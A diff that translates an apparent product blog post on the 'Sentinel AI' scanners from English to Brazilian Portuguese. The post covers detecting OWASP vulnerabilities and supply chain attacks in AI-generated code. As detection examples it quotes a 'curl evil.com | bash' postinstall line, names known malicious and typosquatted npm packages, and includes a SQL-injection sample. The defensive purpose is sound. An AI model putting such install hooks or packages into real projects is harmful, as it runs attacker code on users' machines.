@@ -1,12 +1,12 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Scanning AI-Generated Code for Vulnerabilities Before It Hits Disk | Sentinel AI</title>
-<meta name="description" content="Claude Code writes code fast. Sentinel AI's CodeScanner and DependencyScanner catch OWASP vulnerabilities and supply chain attacks before the code is saved.">
-<meta property="og:title" content="Scanning AI-Generated Code for Vulnerabilities Before It Hits Disk">
-<meta property="og:description" content="OWASP Top 10 detection and supply chain attack prevention for AI-generated code.">
+<title>Escaneando Código Gerado por IA em Busca de Vulnerabilidades Antes de Ir para o Disco | Sentinel AI</title>
+<meta name="description" content="O Claude Code escreve código rápido. O CodeScanner e o DependencyScanner do Sentinel AI capturam vulnerabilidades OWASP e ataques de supply chain antes de o código ser salvo.">
+<meta property="og:title" content="Escaneando Código Gerado por IA em Busca de Vulnerabilidades Antes de Ir para o Disco">
+<meta property="og:description" content="Detecção do OWASP Top 10 e prevenção de ataques de supply chain para código gerado por IA.">
 <meta property="og:type" content="article">
 <style>
   :root {
@@ -106,52 +106,52 @@
 </style>
 </head>
 <body>
-<a href="../" class="back">&larr; Back to Sentinel AI</a>
+<a href="../" class="back">&larr; Voltar ao Sentinel AI</a>
 
-<h1>Scanning AI-Generated Code for Vulnerabilities Before It Hits Disk</h1>
-<div class="meta">March 8, 2026 &middot; 5 min read</div>
+<h1>Escaneando Código Gerado por IA em Busca de Vulnerabilidades Antes de Ir para o Disco</h1>
+<div class="meta">8 de março de 2026 &middot; 5 min de leitura</div>
 
-<p>AI coding assistants like Claude Code can write hundreds of lines per minute. That speed is a feature &mdash; until the generated code contains a SQL injection vulnerability, a hardcoded API key, or a dependency on a known malicious npm package.</p>
+<p>Assistentes de codificação com IA como o Claude Code conseguem escrever centenas de linhas por minuto. Essa velocidade é um recurso &mdash; até o código gerado conter uma vulnerabilidade de SQL injection, uma chave de API hardcoded, ou uma dependência de um pacote npm conhecidamente malicioso.</p>
 
-<p>The problem isn't that AI writes <em>more</em> vulnerable code than humans. It's that AI writes code <em>faster</em>, and the review bottleneck shifts. Traditional code review catches these issues eventually. But in an AI-assisted workflow where code goes from generation to execution in seconds, "eventually" might be too late.</p>
+<p>O problema não é que a IA escreva código <em>mais</em> vulnerável do que humanos. É que a IA escreve código <em>mais rápido</em>, e o gargalo de revisão muda de lugar. A revisão de código tradicional captura esses problemas eventualmente. Mas em um workflow assistido por IA, onde o código vai da geração à execução em segundos, "eventualmente" pode ser tarde demais.</p>
 
-<h2>The Two Scanners</h2>
+<h2>Os Dois Scanners</h2>
 
-<p>Sentinel AI v0.13.0 introduces two scanners designed specifically for this workflow:</p>
+<p>O Sentinel AI v0.13.0 introduz dois scanners desenhados especificamente para esse workflow:</p>
 
-<h3>CodeScanner &mdash; OWASP Top 10 Detection</h3>
+<h3>CodeScanner &mdash; Detecção do OWASP Top 10</h3>
 
-<p>Detects security vulnerabilities in generated Python, JavaScript, and shell code:</p>
+<p>Detecta vulnerabilidades de segurança em código Python, JavaScript e shell gerado:</p>
 
 <table class="vuln-table">
-<tr><th>Category</th><th>Risk</th><th>What It Catches</th></tr>
-<tr><td>SQL Injection</td><td class="risk-critical">CRITICAL</td><td>f-strings, concatenation, .format() in queries</td></tr>
-<tr><td>Command Injection</td><td class="risk-critical">CRITICAL</td><td>subprocess shell=True, os.system, eval with user input</td></tr>
-<tr><td>XSS</td><td class="risk-high">HIGH</td><td>innerHTML, document.write, template |safe filter</td></tr>
-<tr><td>Path Traversal</td><td class="risk-high">HIGH</td><td>open() with user-controlled paths</td></tr>
-<tr><td>Insecure Deserialization</td><td class="risk-high">HIGH</td><td>pickle.load, yaml.load without SafeLoader</td></tr>
-<tr><td>Hardcoded Secrets</td><td class="risk-critical">CRITICAL</td><td>API keys, AWS keys, passwords in source</td></tr>
-<tr><td>Weak Crypto</td><td class="risk-medium">MEDIUM</td><td>MD5/SHA1 for security, AES-ECB, DES</td></tr>
-<tr><td>SSRF</td><td class="risk-high">HIGH</td><td>User-controlled URLs in HTTP requests</td></tr>
+<tr><th>Categoria</th><th>Risco</th><th>O Que Captura</th></tr>
+<tr><td>SQL Injection</td><td class="risk-critical">CRÍTICO</td><td>f-strings, concatenação, .format() em queries</td></tr>
+<tr><td>Command Injection</td><td class="risk-critical">CRÍTICO</td><td>subprocess shell=True, os.system, eval com input do usuário</td></tr>
+<tr><td>XSS</td><td class="risk-high">ALTO</td><td>innerHTML, document.write, filtro |safe de template</td></tr>
+<tr><td>Path Traversal</td><td class="risk-high">ALTO</td><td>open() com caminhos controlados pelo usuário</td></tr>
+<tr><td>Deserialização Insegura</td><td class="risk-high">ALTO</td><td>pickle.load, yaml.load sem SafeLoader</td></tr>
+<tr><td>Segredos Hardcoded</td><td class="risk-critical">CRÍTICO</td><td>Chaves de API, chaves AWS, senhas no código-fonte</td></tr>
+<tr><td>Criptografia Fraca</td><td class="risk-medium">MÉDIO</td><td>MD5/SHA1 para segurança, AES-ECB, DES</td></tr>
+<tr><td>SSRF</td><td class="risk-high">ALTO</td><td>URLs controladas pelo usuário em requisições HTTP</td></tr>
 </table>
 
-<h3>DependencyScanner &mdash; Supply Chain Attack Detection</h3>
+<h3>DependencyScanner &mdash; Detecção de Ataques de Supply Chain</h3>
 
-<p>When Claude Code adds a package to your requirements.txt or package.json, this scanner checks for:</p>
+<p>Quando o Claude Code adiciona um pacote ao seu requirements.txt ou package.json, este scanner verifica:</p>
 
 <ul style="margin: 0.5rem 0 0.5rem 1.5rem;">
-<li><strong>Typosquatting</strong> &mdash; <code class="inline-code">reqests</code> instead of <code class="inline-code">requests</code>, <code class="inline-code">loadash</code> instead of <code class="inline-code">lodash</code></li>
-<li><strong>Known malicious packages</strong> &mdash; crossenv, nodemailer-js, event-stream variants</li>
-<li><strong>Suspicious install scripts</strong> &mdash; <code class="inline-code">postinstall: "curl evil.com | bash"</code></li>
-<li><strong>Suspicious URLs</strong> &mdash; pastebin sources, raw IPs, shady TLDs</li>
-<li><strong>Unpinned versions</strong> &mdash; <code class="inline-code">"*"</code> or <code class="inline-code">"latest"</code></li>
+<li><strong>Typosquatting</strong> &mdash; <code class="inline-code">reqests</code> em vez de <code class="inline-code">requests</code>, <code class="inline-code">loadash</code> em vez de <code class="inline-code">lodash</code></li>
+<li><strong>Pacotes maliciosos conhecidos</strong> &mdash; crossenv, nodemailer-js, variantes de event-stream</li>
+<li><strong>Scripts de instalação suspeitos</strong> &mdash; <code class="inline-code">postinstall: "curl evil.com | bash"</code></li>
+<li><strong>URLs suspeitas</strong> &mdash; fontes em pastebin, IPs crus, TLDs suspeitos</li>
+<li><strong>Versões não fixadas (unpinned)</strong> &mdash; <code class="inline-code">"*"</code> ou <code class="inline-code">"latest"</code></li>
 </ul>
 
-<h2>Usage: Direct Scanning</h2>
+<h2>Uso: Escaneamento Direto</h2>
 
 <pre><code>import { CodeScanner, DependencyScanner } from '@sentinel-ai/sdk';
 
-// Scan generated code
+// Escaneia código gerado
 const codeScan = new CodeScanner();
 const findings = codeScan.scan(`
   cursor.execute(f"SELECT * FROM users WHERE id={user_id}")
@@ -160,7 +160,7 @@ const findings = codeScan.scan(`
 // findings[0]: {category: 'sql_injection', risk: 'CRITICAL'}
 // findings[1]: {category: 'hardcoded_secret', risk: 'CRITICAL'}
 
-// Scan a package.json
+// Escaneia um package.json
 const depScan = new DependencyScanner();
 const depFindings = depScan.scan(JSON.stringify({
   dependencies: { "crossenv": "^1.0.0", "express": "*" },
@@ -170,9 +170,9 @@ const depFindings = depScan.scan(JSON.stringify({
 // depFindings[1]: {category: 'unpinned_dependency', risk: 'MEDIUM'}
 // depFindings[2]: {category: 'dangerous_install_script', risk: 'CRITICAL'}</code></pre>
 
-<h2>Usage: Claude Code PostToolUse Hook</h2>
+<h2>Uso: Hook PostToolUse do Claude Code</h2>
 
-<p>The CodeScanner integrates with Claude Code's hook system to scan code <em>as it's being written</em>:</p>
+<p>O CodeScanner se integra ao sistema de hooks do Claude Code para escanear o código <em>enquanto ele é escrito</em>:</p>
 
 <pre><code># .claude/settings.json
 {
@@ -189,9 +189,9 @@ const depFindings = depScan.scan(JSON.stringify({
   }
 }</code></pre>
 
-<p>Every time Claude Code writes or edits a file, the hook runs the CodeScanner on the output and flags vulnerabilities before the user proceeds.</p>
+<p>Toda vez que o Claude Code escreve ou edita um arquivo, o hook roda o CodeScanner na saída e sinaliza vulnerabilidades antes de o usuário prosseguir.</p>
 
-<h2>Usage: GitHub Action</h2>
+<h2>Uso: GitHub Action</h2>
 
 <pre><code># .github/workflows/security.yml
 - uses: MaxwellCalkin/sentinel-ai@v0.13.0
@@ -200,29 +200,29 @@ const depFindings = depScan.scan(JSON.stringify({
     secrets-scan: true
     block-on: high</code></pre>
 
-<h2>Why Not Just Use a Linter?</h2>
+<h2>Por Que Não Simplesmente Usar um Linter?</h2>
 
-<p>Linters are great for style and static analysis. But they have limitations in the AI-assisted workflow:</p>
+<p>Linters são ótimos para estilo e análise estática. Mas têm limitações no workflow assistido por IA:</p>
 
 <div class="callout">
-<strong>Speed matters.</strong> Sentinel AI scans complete in sub-millisecond time. A traditional lint pass on a full project takes seconds. When you're scanning every Write/Edit tool call in real-time, latency is the enemy.
+<strong>Velocidade importa.</strong> Os escaneamentos do Sentinel AI se completam em tempo sub-milissegundo. Um lint tradicional em um projeto inteiro leva segundos. Quando você está escaneando toda tool call de Write/Edit em tempo real, latência é o inimigo.
 </div>
 
 <div class="callout">
-<strong>Context matters.</strong> Sentinel AI's <code class="inline-code">scanToolOutput()</code> method receives the exact tool name and arguments from Claude Code, so it knows the file path, the content being written, and whether it's a new file or an edit. This lets it make smarter decisions about what to flag.
+<strong>Contexto importa.</strong> O método <code class="inline-code">scanToolOutput()</code> do Sentinel AI recebe o nome exato da ferramenta e os argumentos vindos do Claude Code, então ele sabe o caminho do arquivo, o conteúdo sendo escrito, e se é um arquivo novo ou uma edição. Isso permite decisões mais inteligentes sobre o que sinalizar.
 </div>
 
 <div class="callout">
-<strong>Supply chain attacks aren't syntax errors.</strong> No linter will tell you that <code class="inline-code">crossenv</code> is a known malicious package or that your postinstall script downloads and executes code from a paste site.
+<strong>Ataques de supply chain não são erros de sintaxe.</strong> Nenhum linter vai te dizer que o <code class="inline-code">crossenv</code> é um pacote conhecidamente malicioso ou que seu script postinstall baixa e executa código de um site de paste.
 </div>
 
-<h2>Zero Dependencies, Sub-Millisecond</h2>
+<h2>Zero Dependências, Sub-Milissegundo</h2>
 
-<p>Both scanners use pure regex pattern matching &mdash; no AST parsing, no network calls, no heavy dependencies. Average scan latency is ~0.05ms. The entire JS/TS SDK is a single file with zero npm dependencies.</p>
+<p>Ambos os scanners usam pattern matching de regex puro &mdash; sem parsing de AST, sem chamadas de rede, sem dependências pesadas. A latência média de escaneamento é ~0,05ms. Todo o SDK JS/TS é um único arquivo com zero dependências npm.</p>
 
-<p>Available in Python (<code class="inline-code">pip install sentinel-guardrails</code>) and TypeScript (<code class="inline-code">@sentinel-ai/sdk</code>). Both have full feature parity.</p>
+<p>Disponível em Python (<code class="inline-code">pip install sentinel-guardrails</code>) e TypeScript (<code class="inline-code">@sentinel-ai/sdk</code>). Ambos têm paridade completa de recursos.</p>
 
-<p><a href="https://github.com/MaxwellCalkin/sentinel-ai">View on GitHub</a> &middot; <a href="../">Try the Live Demo</a></p>
+<p><a href="https://github.com/MaxwellCalkin/sentinel-ai">Ver no GitHub</a> &middot; <a href="../">Experimentar a Demo ao Vivo</a></p>
 
 </body>
 </html>
